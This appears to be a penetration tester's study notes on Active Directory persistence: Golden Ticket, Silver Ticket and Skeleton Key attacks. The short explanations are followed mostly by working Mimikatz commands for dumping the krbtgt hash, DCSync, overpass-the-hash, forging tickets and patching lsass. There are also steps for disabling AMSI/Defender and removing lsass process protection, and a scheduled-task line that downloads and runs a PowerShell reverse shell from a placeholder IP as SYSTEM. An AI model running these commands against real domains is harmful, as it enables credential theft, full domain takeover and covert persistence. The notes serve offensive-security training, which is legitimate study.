# AD - Domain Dominance / Persistence

## asics

* Once we have DA - new persistence is possible => escalation to Enterprise Admin and attacks across trusts
* Abusing trusts within domain, across domains and forests
* NTLM hash vor Kerberos are RC4, DES (both old) or AES encrypted&#x20;
* Kerberos policy only checked when TGT is created
* DC validates user account only when TGT > 20min
* Service Ticket (TGS) PAC is optional and not very often used
  * Server LSASS sends PAC validation request to DC netlogon service (NRPC)
  * It runs as servce, PAC validation is optional (disabled)
  * If a service runs as Syste, it performs server signature verification on the PAC (Computer account long-term key)

**How Kerberos works**

<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

1. Password converted to NTLM hash. A Timestamp is encrypted and signed with the NTLM hash of the Users Password and sent to the KDC (AS-REQ)
2. The TGT (Ticket granting ticket) is generated and encrypted & signed with the NTLM Hash of krbtgt hash
3. The TGT is sent back to DC, because client can not decrypt it. Client Request a TGS (Ticket granting service). \
   The DC assumes whatever is inside the TGT, as long as it can be decrypted with krbtgt, it is assumed to be valid.\
   ‚ùìUp to 20 Minutes the TGT is valid?
4. The TGS is returned with encryption of the target service/application service's NTLM hash
5. The Applicatoin Server decrypts the TGS because it is with its own service NTLM hash encrypted, and then decides whether user can access

## ü•áüé´Golden Ticket Attack

### Description

* Abuse is in Step 3 and 4, where a valid TGT is generated&#x20;
* A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket
* Since user account validation is not done by DC until TGT is older than 20min, we use even deleted/revoked accounts
* The krbtgt user hash could be used to impersonate any user with any privilege from even a non-domain machine
* Password change (of krbtgt account)has no effect on this attack because previous hash will also be accpeted - you have to change the pw of krbtgt twice

### Requirements

* krbtgt Hash has to be known

### Tools

**Execute Mimikatz on DC to get krbtgt hash - required DA privs**\
Invoke-Mimikatz -command '"lsadump:lsa /patch" -computername dc-hostname

&#x20;With powershell session on dc:\
$sess = New-Session -Computername dc.local\
Disable AMSI/Defender in that session\
Exit\
Invoke-command -session $ses -filepath C:\invoke-mimikatz.ps1\
Enter-Pssession  -session $sess\
Invoke-Mimikatz -command '"lsadump:lsa /patch\


**To use the DCSync feature for getting krbtgt hash, execute the following command - require DA privs:**\
Invoke-Mimikatz -command '"lsadump:dcsync /user:dom\krbtgt"'

**Overpass the hash to start powershell**\
Invoke-Mimikatz -command '"sekurlsa:pth /user:svcadmin /domain:dom.local /ntlm:hash /run:powershell.exe"'



**Create a golden ticket when we have the krbtgt hash extracted from above** \
****Invoke-Mimikatz - command '"kerberos::golden /User:Administrator /domain:dom.local /sid:S-1-5-21-..... /krbtgt:hash.... id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

Use DCsync Attack / more silent in DC Logs

## ü•àüé´Silver Ticket Attack

### Description

* Step 5 is abused (AP-REQ)
* Trust anchor/key is the NTLM Hash of the Service Account of the application server. You can then access the service by impersonating any user, also high privs User
* A Silver Ticket is a valid TGS
* Encrypted and signed NTLM hash of the service account of the service running with that account
* Service rareley chekcs PAC (Privileged Attriute Certificate) - if it is enabled (default disabled), Silver Ticket Attack will fail
* Services will allow access only to the service themeselves
* ‚ùì Resonable persistence period (default 30 days for computer accounts) - but machine can request ist earlier or later - disable the change of machine password is also possible
* Interesting Service Accounts: CIFS, host, rpcss (can be used by WMI),wsman (powershell remoting) - all of them use the machine account as their service account

### Requirement

Machine account hash (e.g. after krbtgt&#x20;

### Tools

**Get domain controller account hash**\
Invoke-Mimikatz -Command '"kerberos:golden /domain:dom.local /sid:S-1-5... /target:target-host.local /service:cifs /rc4:hash /user:Administrator /ptt"'

<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
* Target is the host from where whe have the service account hash
* Using "cifs" service for later access the filesystem of the Server
* Using "host" service allows to schedule tasks then on the target host
* List of SPN which can be used: https://adsecurity.org/?page\_id=183&#x20;
{% endhint %}

**Schedudle an execute a task with silver ticket of "HOST" Service**

schtasks /create /S hostname.dom.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (new-object net.webclient).DownloadString(''http://ip/Invoke\_powerShellTcp.ps1''')'"

schtasks /Run /S hostname.dom.local /TN "STCheck"

{% hint style="info" %}
* Attention: Within Download String these are two '
* STCheck is the Name of the task you create
{% endhint %}

**List tasks**\
****schtasks /S hostname.dom.local

## ü¶¥Skeleton Key

### Description

* Skeleton KEy is a persistance technique whewre it is possible to patch a Domain Controllers lsass process, that it allows access ans any user with a single password.
* The regular Password and the new password will work
* Malware named "Skeleton Key" used it
* Not persistent after reboot/lsass process restart
* You can access other machines, which authenticate to this DC
* You can not patch lsass twice, reboot is required

### Requirements

* Needs DA rights

### Tools

**Inject a skeleton key, password will be mimikatz - DA rights required**\
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName dc-hostname.dom.local

Now you can login e.g. with Enter-PSSession

‚ùìDebug really needed?

{% hint style="info" %}
If lsass runs as protected process/protected process light, skeleton key can still be used. We need to use the mimikatz driver (mimidriv.sys) on the disk of the target DC:

mimikatz#privilege::debug\
mimikatz# !+\
mimikatz# !processprotect /process:lsass.exe /remove\
mimikatz# misc::skeleton\
mimikatz# !-

Noisy in logs - Service Installation for a kernel mode driver will be displayed

‚ùì(Still work??) => This will install kernel mode driver
